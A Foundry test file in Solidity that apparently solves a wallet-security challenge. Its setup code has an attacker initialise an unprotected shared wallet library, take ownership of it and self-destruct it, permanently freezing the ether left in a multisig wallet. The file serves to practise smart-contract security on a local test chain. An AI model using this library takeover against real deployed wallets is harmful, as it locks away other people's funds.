// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// utilities
import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
// core contracts
import {ISafuWalletLibrary} from "src/safu-wallet/ISafuWalletLibrary.sol";
import {SafuWallet} from "src/safu-wallet/SafuWallet.sol";


contract Testing is Test {

    address attacker = makeAddr('attacker');
    address o1 = makeAddr('o1');
    address o2 = makeAddr('o2');
    address admin = makeAddr('admin'); // should not be used
    address adminUser = makeAddr('adminUser'); // should not be used

    ISafuWalletLibrary safuWalletLibrary;
    SafuWallet safuWallet;

    /// preliminary state
    function setUp() public {

        // funding accounts
        vm.deal(admin, 10_000 ether);
        vm.deal(attacker, 10_000 ether);
        vm.deal(adminUser, 10_000 ether);

        // deploying core contracts
        vm.prank(admin);
        safuWalletLibrary = ISafuWalletLibrary(
            deployCode("out/SafuWalletLibrary.sol/SafuWalletLibrary.json")
        );

        address[] memory addresses = new address[](1);
        addresses[0] = adminUser;

        vm.prank(admin);
        safuWallet = new SafuWallet(
            addresses, // msg.sender is automatically an owner
            2, // both admins required to execute transactions
            type(uint).max // max daily limit
        );

        // admin deposits 100 ETH to the wallet
        vm.prank(admin);
        payable(safuWallet).transfer(100e18);

        // admin withdraws 50 ETH from the wallet
        bytes memory data = abi.encodeWithSignature(
            'execute(address,uint256,bytes)',
            admin, 50e18, ""
        );
        vm.prank(admin);
        address(safuWallet).call(data);

        // NOTE: This challenge requires you to implement the exploit here in setUp()
        vm.startPrank(attacker,attacker);

        address[] memory addresses2 = new address[](0);
        safuWalletLibrary.initWallet(addresses2,1,type(uint).max);
        safuWalletLibrary.kill(attacker);

        vm.stopPrank();

    }

    /// solves the challenge
    function testChallengeExploit() public {
        // NOTE: This challenge requires you to implement the exploit at the bottom of setUp()
        validation();
    }

    /// expected final state
    function validation() public {

        // admin attempting to withdraw final 50 ETH - should fail
        bytes memory data = abi.encodeWithSignature(
            'execute(address,uint256,bytes)',
            admin, 50e18, ""
        );
        vm.prank(admin);
        address(safuWallet).call(data);

        assertEq(address(safuWallet).balance,50e18);

    }

}